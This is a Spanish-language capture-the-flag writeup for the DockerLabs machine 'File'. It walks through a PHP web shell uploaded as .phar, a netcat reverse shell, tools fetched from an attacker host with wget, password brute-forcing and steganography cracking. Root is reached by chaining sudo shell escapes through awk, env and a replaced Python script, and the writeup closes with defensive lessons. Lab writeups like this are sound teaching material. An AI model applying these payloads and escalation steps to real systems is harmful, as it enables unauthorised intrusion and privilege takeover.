# File — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** Scuffito y Jul3n-dot  
**Fecha de creación:** 29/11/2024  
**Técnicas:** Nmap · FTP anónimo · Gobuster · File Upload (.phar) · Reverse Shell · Linux-Su-Force · SCP · Steghide · Stegcracker · CrackStation · Escalada encadenada (awk→env→python3) 

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — formulario de subida](#2-enumeración-web--formulario-de-subida)
3. [Bypass de extensión y Reverse Shell](#3-bypass-de-extensión-y-reverse-shell)
4. [Fuerza bruta local con Linux-Su-Force](#4-fuerza-bruta-local-con-linux-su-force)
5. [Steganografía — imagen con hash SHA1](#5-steganografía--imagen-con-hash-sha1)
6. [Escalada encadenada — mario → julen → iker → root](#6-escalada-encadenada--mario--julen--iker--root)
7. [Lección aprendida](#7-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh file.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--  1 65534  65534  33 Sep 12 2024 anon.txt
80/tcp open  http    syn-ack ttl 64
| http-title: Apache2 Ubuntu Default Page: It works
```

FTP anónimo con un fichero `anon.txt` y servidor web.

---

## 2. Enumeración web — formulario de subida

La web muestra la página por defecto de Apache. Lanzamos Gobuster:

```bash
sudo gobuster dir -u http://172.17.0.2 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x html,py,txt,php -t 100 -k -r
```

```
/uploads         (Status: 200) [Size: 741]
/index.html      (Status: 200) [Size: 11008]
/server-status   (Status: 403) [Size: 275]
/file_upload.php (Status: 200) [Size: 468]
```

Visitamos `http://172.17.0.2/file_upload.php` — formulario para subir archivos. Intentamos con `.php` → rechazado. Probamos con `.phar`:

```bash
nano prueba.php
# contenido: <?php system($_GET['cmd']); ?>
mv prueba.php prueba.phar
```

Subimos `prueba.phar`:

```
El archivo prueba.phar ha sido subido con exito.
```

---

## 3. Bypass de extensión y Reverse Shell

Confirmamos RCE desde `/uploads/`:

```
http://172.17.0.2/uploads/prueba.phar?cmd=id
```

```
uid=33(www-data)
```

Reverse shell con nc en puerto 443 y payload Bash de revshells.com:

```bash
sudo nc -lvnp 443
```

```bash
www-data@95696acd0fef:/home$ ls
fernando  iker  julen  mario
```

Cuatro usuarios en el sistema.

---

## 4. Fuerza bruta local con Linux-Su-Force

Ninguna escalada directa por sudo o SUID. Usamos [Linux-Su-Force](https://github.com/Maalfer/Sudo_BruteForce) para fuerza bruta local.

Desde nuestra máquina atacante:

```bash
ls
# Linux-Su-Force.c  Linux-Su-Force.sh  rockyou.txt
python3 -m http.server 8000
```

En la víctima:

```bash
www-data@95696acd0fef:/var/www/html$ wget http://192.168.1.26:8000/Linux-Su-Force.sh
www-data@95696acd0fef:/var/www/html$ wget http://192.168.1.26:8000/rockyou.txt
www-data@95696acd0fef:/var/www/html$ chmod +x Linux-Su-Force.sh
www-data@95696acd0fef:/var/www/html$ ./Linux-Su-Force.sh fernando rockyou.txt
```

```
Contraseña encontrada para el usuario fernando: chocolate
```

```bash
www-data@95696acd0fef:/home$ su fernando
Password: chocolate
fernando@95696acd0fef:~$ ls
dragon-medieval.jpeg
```

---

## 5. Steganografía — imagen con hash SHA1

Nos copiamos la imagen a nuestra máquina para analizarla. Primero hacemos escribible el directorio:

```bash
www-data@95696acd0fef:/var/www/html$ chmod o+wrx /var/www/html
www-data@95696acd0fef:/var/www/html$ su fernando
fernando@95696acd0fef:~$ mv dragon-medieval.jpeg /var/www/html/
```

Descargamos desde nuestra máquina:

```bash
wget http://172.17.0.2/dragon-medieval.jpeg
```

Intentamos steghide sin contraseña → falla. Usamos stegcracker para fuerza bruta:

```bash
stegcracker dragon-medieval.jpeg /usr/share/wordlists/rockyou.txt
```

```
Successfully cracked file with password: secret
Your file has been written to: dragon-medieval.jpeg.out
```

Extraemos con la contraseña encontrada:

```bash
steghide extract -sf dragon-medieval.jpeg
Anotar salvoconducto: secret
anot• los datos extra•dos e/"pass.txt".
cat pass.txt
cbfdac6008f9cab4083784cbd1874f76618d2a97
```

Hash SHA1. Lo crackeamos en [crackstation.net](https://crackstation.net/):

```
cbfdac6008f9cab4083784cbd1874f76618d2a97  →  sha1  →  password123
```

---

## 6. Escalada encadenada — mario → julen → iker → root

### mario (contraseña: password123)

```bash
www-data@95696acd0fef:/home$ su mario
Password: password123
mario@95696acd0fef:/home$ sudo -l
User mario may run the following commands:
    (julen) NOPASSWD: /usr/bin/awk
```

### mario → julen (awk/sudo)

```bash
mario@95696acd0fef:/home$ sudo -u julen /usr/bin/awk 'BEGIN {system("/bin/sh")}'
$ whoami
julen
```

### julen → iker (env/sudo)

```bash
julen@95696acd0fef:/home$ sudo -l
User julen may run the following commands:
    (iker) NOPASSWD: /usr/bin/env
julen@95696acd0fef:/home$ sudo -u iker /usr/bin/env /bin/sh
$ whoami
iker
```

### iker → root (python3/sudo con script propio)

```bash
iker@95696acd0fef:~$ sudo -l
User iker may run the following commands:
    (ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py
```

El fichero `geo_ip.py` pertenece a root pero podemos eliminarlo y crear uno nuevo:

```bash
iker@95696acd0fef:~$ rm geo_ip.py
rm: remove write-protected regular file 'geo_ip.py'? yes
iker@95696acd0fef:~$ echo "import os; os.system ('/bin/bash')" > geo_ip.py
iker@95696acd0fef:~$ sudo /usr/bin/python3 /home/iker/geo_ip.py
root@95696acd0fef:/home/iker# whoami
root
```

✅ Somos **root**.

---

## 7. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **File upload con bypass .phar** | `file_upload.php` | RCE |
| **Contraseña débil (chocolate)** | Usuario fernando | Acceso via Linux-Su-Force |
| **Imagen con hash SHA1 oculto** | `dragon-medieval.jpeg` | Hash crackeado → password123 |
| **Escalada encadenada (awk→env→python3)** | Sudoers de mario/julen/iker | Acceso root |

**Para defenderse:**
- Validar MIME real del archivo en uploads — `.phar` ejecuta PHP igual que `.php`.
- Los hashes SHA1 sin sal son trivialmente crackeables en crackstation.net.
- Los scripts sudo deben pertenecer a root y no ser eliminables ni recreables por el usuario.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
